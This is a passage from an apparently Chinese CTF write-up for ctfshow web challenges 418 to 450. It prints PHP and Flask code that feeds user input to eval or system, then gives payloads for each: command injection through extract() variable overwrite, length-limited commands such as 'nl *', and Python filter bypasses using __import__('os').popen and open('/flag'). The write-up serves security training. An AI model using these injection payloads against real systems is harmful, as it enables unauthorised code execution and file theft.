class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 23:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$key</span>= <span class="number">0</span>;</span><br><span class="line"><span class="variable">$clear</span>=<span class="string">&#x27;clear.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取参数</span></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"><span class="comment">//包含清理脚本</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$clear</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>===<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="comment">//帮黑阔写好后门</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p><p>这里有点误导让你，去写后门，但是$key===0x36d这个是强等于,0x36d 这个是integer整形，但是传的字符串却是字符型，绕不过去，所以这题用变量覆盖修改$clear就可以了，</p><p><strong>extract</strong>   ——-&gt;   变量覆盖</p><p><img src="../images/image-20230401161846730.png" alt="image-20230401161846730"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">die</span>=<span class="number">0</span>&amp;clear=;cp flag.php flag.txt</span><br></pre></td></tr></table></figure><p>payload的意思是，因为if那绕不过去了，所以会执行下面的语句，然后为了能执行clear($clear),所以就让$die为0，然后就可以执行到clear了</p><p><strong>这里加的分号是为了不让rm -rf删掉文件</strong></p><p>然后就会执行clear(rm -rf;cp flag.php flag.txt)</p><h2 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:36:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat f*`;</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval($_POST[1]);&amp;1=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:41:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话是先用    ls 查找flag位置，然后用<code>ls ../</code>找到了flag位置，然后直接读取</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl ../*</span><br></pre></td></tr></table></figure><h2 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><h2 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><h2 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h2><p>题目</p><h2 id="web424-ssti"><a href="#web424-ssti" class="headerlink" title="web424(ssti)"></a>web424(ssti)</h2><p>题目</p><p><img src="../images/image-20230405212426830.png" alt="image-20230405212426830"></p><p>查看注释发现给了一个参数可以进行传值</p><p><img src="../images/image-20230405212500712.png" alt="image-20230405212500712"></p><p><strong>源码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里因为没有os模块了，那么直接就用open来拿到flag</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag).read()</span></span><br></pre></td></tr></table></figure><p>自己导入有个os模块也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat app.py&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web425-过滤了os"><a href="#web425-过滤了os" class="headerlink" title="web425(过滤了os)"></a>web425(过滤了os)</h2><p>题目</p><p><img src="../images/image-20230405213333700.png" alt="image-20230405213333700"></p><p>还是一样</p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230405213451936.png" alt="image-20230405213451936"></p><p>使用这个<strong>open</strong>的前提是得知道文件名     <strong>这个不能使用通配符</strong></p><h2 id="web426-过滤了os-popen"><a href="#web426-过滤了os-popen" class="headerlink" title="web426(过滤了os|popen)"></a>web426(过滤了os|popen)</h2><p>题目</p><p><img src="../images/image-20230405213734721.png" alt="image-20230405213734721"></p><p>还是不影响</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web427-过滤了os-popen-system"><a href="#web427-过滤了os-popen-system" class="headerlink" title="web427(过滤了os|popen|system)"></a>web427(过滤了os|popen|system)</h2><p>题目</p><p><img src="../images/image-20230405213949469.png" alt="image-20230405213949469"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web428-过滤os-popen-system-read"><a href="#web428-过滤os-popen-system-read" class="headerlink" title="web428(过滤os|popen|system|read)"></a>web428(过滤os|popen|system|read)</h2><p>题目</p><p><img src="../images/image-20230405214151770.png" alt="image-20230405214151770"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>因为这里是只匹配开头</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web429-ssti-过滤了os-open-system-read"><a href="#web429-ssti-过滤了os-open-system-read" class="headerlink" title="web429(ssti 过滤了os|open|system|read)"></a>web429(ssti 过滤了os|open|system|read)</h2><p>题目<img src="../images/image-20230405214409832.png" alt="image-20230405214409832"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这里匹配是只匹配了开头，<strong>所以只需要在payload前面加个空格就好了</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web430-ssti-过滤了os-open-system-read-eval"><a href="#web430-ssti-过滤了os-open-system-read-eval" class="headerlink" title="web430(ssti 过滤了os|open|system|read|eval)"></a>web430(ssti 过滤了os|open|system|read|eval)</h2><p><strong>同 web429的做法</strong></p><p>也是只匹配开头</p><h2 id="web-431-ssti-过滤了过滤了os-open-system-read-eval-str"><a href="#web-431-ssti-过滤了过滤了os-open-system-read-eval-str" class="headerlink" title="web 431 ssti 过滤了过滤了os|open|system|read|eval|str"></a>web 431 ssti 过滤了过滤了os|open|system|read|eval|str</h2><p><strong>同web430</strong></p><p><strong>后面就是正常的过滤了，因为过滤了eval所以我们只能用exec来执行了.但是exec的返回值永远是none，所以只能用一些盲打的方法了。</strong></p><h2 id="web432-过滤os-open-system-read-eval-web449都是ssti的题目"><a href="#web432-过滤os-open-system-read-eval-web449都是ssti的题目" class="headerlink" title="web432(过滤os|open|system|read|eval)-web449都是ssti的题目"></a>web432(过滤os|open|system|read|eval)-web449都是ssti的题目</h2><p>这里就不做了</p><h2 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 